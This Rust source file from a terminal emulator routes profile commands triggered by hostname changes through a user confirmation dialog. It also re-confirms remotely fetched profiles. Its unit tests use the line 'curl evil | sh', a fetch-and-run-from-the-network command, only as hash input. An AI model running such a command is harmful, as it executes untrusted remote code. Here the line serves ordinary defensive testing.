//! Profile commands behind the trigger confirmation dialog.
//!
//! ## Security
//!
//! A profile may carry a `command` that is written straight into the running
//! shell. The trigger for that write is an OSC 7 sequence, which is emitted by
//! whatever is producing terminal output — including a remote host over SSH —
//! and a `*` hostname pattern matches everything. Profile commands are
//! therefore never executed inline. They go through the same confirmation queue
//! the trigger subsystem uses for `RunCommand` / `SendText`
//! (`TriggerState::pending_trigger_actions`), so the user sees the exact command
//! before it runs. Three rules sit on top of that queue:
//!
//! 1. `ssh.ssh_auto_profile_switch` gates hostname-driven switching entirely.
//! 2. A profile fetched from a dynamic (remote) source re-confirms every time,
//!    even if the user previously chose "Always Allow" for it.
//! 3. The command targets the tab whose hostname or directory matched
//!    (UX.md PR6 evaluates background tabs too), never "whatever tab is active
//!    when the user clicks Allow".

use par_term_config::ProfileId;
use par_term_emu_core_rust::terminal::ActionResult;

use super::super::window_state::{AutomationTarget, WindowState};

/// Marker bit set on every synthetic profile-command confirmation id.
///
/// The core `TriggerRegistry` hands out real trigger ids sequentially starting
/// at 1, so tagging the high bit keeps profile ids out of that space and stops
/// an "Always Allow" grant from leaking across the two systems.
const PROFILE_COMMAND_ID_TAG: u64 = 1 << 63;

/// Synthetic confirmation id for a profile command.
///
/// Derived from the command text as well as the profile id, so an
/// "Always Allow" grant does not transfer to a different command when the
/// profile is edited or re-fetched.
fn profile_command_action_id(profile_id: &ProfileId, command_line: &str) -> u64 {
    use std::hash::{Hash, Hasher};

    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    profile_id.hash(&mut hasher);
    command_line.hash(&mut hasher);
    hasher.finish() | PROFILE_COMMAND_ID_TAG
}

/// Build the shell line for a profile's `command` plus `command_args`.
///
/// Returns `None` when the profile has no command or the command is blank.
fn profile_command_line(command: Option<&str>, args: Option<&[String]>) -> Option<String> {
    let command = command?.trim();
    if command.is_empty() {
        return None;
    }

    let mut line = command.to_string();
    for arg in args.unwrap_or_default() {
        line.push(' ');
        line.push_str(arg);
    }
    line.push('\n');
    Some(line)
}

/// Whether a profile command may skip the confirmation dialog.
///
/// `session_approved` is the user's earlier "Always Allow" for this exact
/// command. It is honoured only for local profiles: the user consented to a
/// profile *source*, not to arbitrary commands from it, and that source can
/// change the command on any refresh.
fn profile_command_pre_approved(remote_origin: bool, session_approved: bool) -> bool {
    !remote_origin && session_approved
}

/// The tab a profile command must land in: the matched tab of this window,
/// or `None` (the active tab at approval time) when no tab is named.
pub(crate) fn command_target(
    window_id: Option<winit::window::WindowId>,
    tab: Option<crate::tab::TabId>,
) -> Option<AutomationTarget> {
    Some(AutomationTarget {
        window_id: window_id?,
        tab_id: tab?,
    })
}

/// A profile command waiting to be queued: the profile and the shell line.
pub(crate) struct ProfileCommand<'a> {
    pub(crate) profile_id: ProfileId,
    pub(crate) profile_name: &'a str,
    pub(crate) command: Option<&'a str>,
    pub(crate) command_args: Option<&'a [String]>,
    pub(crate) remote_origin: bool,
    pub(crate) match_reason: &'a str,
}

impl WindowState {
    /// Queue a profile's `command` for execution behind the trigger
    /// confirmation dialog, against the active tab.
    ///
    /// Used by the tmux gateway, whose session match is about the gateway
    /// tab the user is looking at.
    pub(crate) fn dispatch_profile_command(
        &mut self,
        profile_id: ProfileId,
        profile_name: &str,
        command: Option<&str>,
        command_args: Option<&[String]>,
        remote_origin: bool,
        match_reason: &str,
    ) {
        self.queue_profile_command(
            ProfileCommand {
                profile_id,
                profile_name,
                command,
                command_args,
                remote_origin,
                match_reason,
            },
            None,
        );
    }

    /// Queue `cmd` for confirmation, targeting `tab` when given (an
    /// auto-switch on a background tab). Returns the confirmation id when a
    /// dialog was queued, so an Undo can withdraw it.
    ///
    /// The command is never written to the shell from here: it is pushed
    /// onto `TriggerState::pending_trigger_actions` as a `SendText` action,
    /// and the trigger dialog performs the single write once the user
    /// approves. That keeps one execution sink for every automated write
    /// into the shell, and it means auto-switch inherits the trigger
    /// subsystem's audit logging.
    pub(crate) fn queue_profile_command(
        &mut self,
        cmd: ProfileCommand<'_>,
        tab: Option<crate::tab::TabId>,
    ) -> Option<u64> {
        let command_line = profile_command_line(cmd.command, cmd.command_args)?;
        let action_id = profile_command_action_id(&cmd.profile_id, &command_line);
        let session_approved = self
            .trigger_state
            .always_allow_trigger_ids
            .contains(&action_id);
        let action = ActionResult::SendText {
            trigger_id: action_id,
            text: command_line.clone(),
            delay_ms: 0,
        };
        let target = command_target(self.window.as_ref().map(|w| w.id()), tab);

        if profile_command_pre_approved(cmd.remote_origin, session_approved) {
            match target {
                Some(target) => self
                    .trigger_state
                    .approved_targeted_actions
                    .push((target, action)),
                None => self.trigger_state.approved_pending_actions.push(action),
            }
            return None;
        }

        // A hostname that flaps would otherwise stack one dialog per transition.
        if self
            .trigger_state
            .pending_trigger_actions
            .iter()
            .any(|pending| pending.trigger_id == action_id)
        {
            return Some(action_id);
        }

        let displayed = command_line.trim_end();
        crate::debug_info!(
            "PROFILE",
            "AUDIT profile command queued for confirmation profile='{}' remote={} command={:?}",
            cmd.profile_name,
            cmd.remote_origin,
            displayed
        );

        let origin_note = if cmd.remote_origin {
            "\nThis profile was fetched from a remote profile source."
        } else {
            ""
        };
        // Without an entry here the dialog claims "A trigger matched terminal
        // output", which is false for this producer. Registered only on the path
        // that actually queues a dialog — the dialog removes the entry when the
        // action resolves, so an entry on a path that never queues would leak.
        self.trigger_state.automation_action_notes.insert(
            action_id,
            "Automatic profile switching queued this, not an output trigger. \
             Approving runs the command shown above in this shell."
                .to_string(),
        );
        self.trigger_state.pending_trigger_actions.push(
            crate::app::window_state::PendingTriggerAction {
                trigger_id: action_id,
                trigger_name: format!("Profile auto-switch: {}", cmd.profile_name),
                action,
                description: format!(
                    "Matched {}.{}\nRun in this shell: {}",
                    cmd.match_reason, origin_note, displayed
                ),
                target,
            },
        );
        Some(action_id)
    }

    /// Withdraw a queued profile-command confirmation (the switch that
    /// queued it was undone or reverted before the user answered).
    pub(crate) fn withdraw_profile_command(&mut self, action_id: u64) {
        self.trigger_state
            .pending_trigger_actions
            .retain(|pending| pending.trigger_id != action_id);
        self.trigger_state
            .automation_action_notes
            .remove(&action_id);
    }
}

#[cfg(test)]
mod tests {
    use super::{
        PROFILE_COMMAND_ID_TAG, profile_command_action_id, profile_command_line,
        profile_command_pre_approved,
    };

    fn id() -> par_term_config::ProfileId {
        uuid::Uuid::nil()
    }

    #[test]
    fn command_line_is_none_without_a_command() {
        assert_eq!(profile_command_line(None, None), None);
        assert_eq!(profile_command_line(Some("   "), None), None);
    }

    #[test]
    fn command_line_appends_args_and_newline() {
        assert_eq!(
            profile_command_line(
                Some("tmux"),
                Some(&["attach".to_string(), "-t".to_string()])
            ),
            Some("tmux attach -t\n".to_string())
        );
        assert_eq!(
            profile_command_line(Some("htop"), None),
            Some("htop\n".to_string())
        );
    }

    #[test]
    fn action_ids_never_collide_with_real_trigger_ids() {
        // The core TriggerRegistry allocates trigger ids sequentially from 1,
        // so the tag bit must always be set on a profile command id.
        for command in ["a\n", "curl evil | sh\n", ""] {
            let action_id = profile_command_action_id(&id(), command);
            assert_ne!(action_id & PROFILE_COMMAND_ID_TAG, 0);
            assert!(action_id > u64::from(u32::MAX));
        }
    }

    #[test]
    fn action_id_is_stable_and_command_bound() {
        let a = profile_command_action_id(&id(), "echo hi\n");
        assert_eq!(a, profile_command_action_id(&id(), "echo hi\n"));
        assert_ne!(a, profile_command_action_id(&id(), "curl evil | sh\n"));
        assert_ne!(
            a,
            profile_command_action_id(&uuid::Uuid::from_u128(1), "echo hi\n")
        );
    }

    #[test]
    fn remote_profile_command_always_requires_confirmation() {
        // Even with a prior "Always Allow" for this exact command, a profile
        // fetched from a dynamic source must re-confirm: the source can change
        // the command on any refresh.
        assert!(!profile_command_pre_approved(true, true));
        assert!(!profile_command_pre_approved(true, false));
    }

    #[test]
    fn local_profile_command_honours_an_earlier_always_allow() {
        assert!(profile_command_pre_approved(false, true));
        assert!(!profile_command_pre_approved(false, false));
    }
}
